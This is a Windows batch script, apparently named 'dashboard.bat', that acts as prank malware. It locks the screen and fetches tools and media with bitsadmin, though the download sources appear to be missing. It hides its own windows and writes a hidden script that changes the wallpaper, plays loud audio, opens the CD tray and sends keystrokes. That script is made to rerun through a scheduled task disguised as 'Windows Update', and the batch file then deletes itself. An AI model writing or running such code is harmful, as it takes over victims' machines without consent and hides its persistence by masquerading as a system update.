@echo off
rundll32.exe user32.dll,LockWorkStation
if not exist %TMP%\nircmd.exe (bitsadmin /transfer nircmd /download /priority normal nircmd.exe %TMP%\nircmd.exe)
"%TMP%\nircmd.exe" win min alltopnodesktop
cls
"%TMP%\nircmd.exe" win hide ititle "cmd.exe"
"%TMP%\nircmd.exe" win hide ititle "dashboard.bat"
if not exist %TMP%\lol.jpg (bitsadmin /transfer lol /download /priority normal lol.jpg %TMP%\lol.jpg)
if not exist %TMP%\WallpaperChanger.exe (bitsadmin /transfer wp /download /priority normal WallpaperChanger.exe %TMP%\WallpaperChanger.exe)
if not exist %TMP%\trololo.mp3 (bitsadmin /transfer wp /download /priority normal trololo.mp3 %TMP%\trololo.mp3)
if exist %LOCALAPPDATA%\lol.bat (del /f /q %LOCALAPPDATA%\lol.bat)
echo @echo off >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" win hide ititle "cmd.exe" >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" win hide ititle "lol.bat" >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" win child class "Shell_TrayWnd" hide class "TrayClockWClass" >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\WallpaperChanger.exe" "%TMP%/lol.jpg" 4 >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" win trans ititle "outlook.exe" 200 >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" sendkeypress numlock >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" sendkeypress capslock >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" sendkeypress 0x91 >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" cdrom open >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" mutesysvolume 0 >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" setsysvolume 32770 >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" mediaplay 171000 %TMP%\trololo.mp3 >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" sendkeypress lwin+0x6B >>%LOCALAPPDATA%\lol.bat
echo "%TMP%\nircmd.exe" sendkeypress ctrl+alt+0x49 >>%LOCALAPPDATA%\lol.bat
SCHTASKS.EXE /CREATE /SC MINUTE /MO 81 /TN "Windows Update" /ST 09:00:00 /SD 01/01/2018 /TR %LOCALAPPDATA%\lol.bat /F
del /f /q %0
